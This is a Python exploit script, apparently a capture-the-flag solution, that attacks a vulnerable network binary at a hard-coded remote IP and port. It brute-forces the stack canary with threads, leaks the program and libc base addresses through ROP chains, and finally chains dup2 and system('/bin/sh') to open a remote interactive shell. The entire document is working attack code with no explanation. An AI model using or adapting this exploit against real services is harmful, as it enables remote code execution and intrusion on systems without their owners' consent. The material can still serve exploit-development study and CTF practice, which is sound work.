import threading
from ptrlib import *
logger.level = 0

elf = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")

#HOST, PORT = "localhost", 4444
HOST, PORT = "35.202.40.104", 2222

flag = False
def leak_canary(c, canary, results):
    global flag
    payload = b'A' * 0x88
    payload += canary + bytes([c])
    sock = Socket(HOST, PORT)
    sock.recvline()
    sock.send(payload)
    r = sock.recv(timeout=0.5)
    print(hex(c), r)
    if r is None:
        sock.close()
    elif b'No way' in r:
        flag = True
        print(b"canary = " + canary + bytes([c]))
        results[1] = c
        sock.close()
    exit()

# leak canary
#canary = b'\x00\xba\x07\xc5Nx\x8c\xa1'
canary = b'\x00\xfe\xc8k\x98\xe6\x91>'
"""
canary = b'\x00\xfe\xc8k\x98\xe6\x91>'
for i in range(8 - len(canary)):
    thList = []
    results = {}
    flag = False
    for c in range(0x100):
        th = threading.Thread(target=leak_canary, args=([c, canary, results]))
        thList.append(th)
    for th in thList:
        th.start()
        if flag: break
        time.sleep(0.05)
    print(results)
    canary += bytes([results[1]])
#"""

# leak proc base
sock = Socket(HOST, PORT)
payload = b'A' * 0x88
payload += canary
payload += b'A' * 8
payload += p64(0x38)[:1]
sock.recvline()
sock.send(payload)
proc_base = u64(sock.recv()[len(payload) - 1:][:8]) - 0x133d
#logger.info("proc base = " + hex(proc_base))
print(hex(proc_base))
sock.close()

rop_pop_rsi_r15 = 0x000015a1
rop_pop_rdi = 0x000015a3

# leak libc base
sock = Socket(HOST, PORT)
payload = b'A' * 0x88
payload += canary
payload += b'A' * 8
payload += p64(proc_base + rop_pop_rsi_r15)
payload += p64(proc_base + elf.got("write"))
payload += p64(0xdeadbeef)
payload += p64(proc_base + elf.plt("write"))
sock.recvline()
sock.send(payload)
libc_base = u64(sock.recv()[:8]) - libc.symbol("write")
#logger.info("libc base = " + hex(libc_base))
print(hex(libc_base))
sock.close()

# get the shell!
sock = Socket(HOST, PORT)
payload = b'A' * 0x88
payload += canary
payload += b'A' * 8
payload += p64(proc_base + rop_pop_rdi + 1)
payload += p64(proc_base + rop_pop_rsi_r15)
payload += p64(0)
payload += p64(0xdeadbeef)
payload += p64(libc_base + libc.symbol("dup2"))
payload += p64(proc_base + rop_pop_rsi_r15)
payload += p64(1)
payload += p64(0xdeadbeef)
payload += p64(libc_base + libc.symbol("dup2"))
payload += p64(proc_base + rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
payload += p64(0xfffffffffffffffa)
sock.recvline()
sock.send(payload)

sock.interactive()
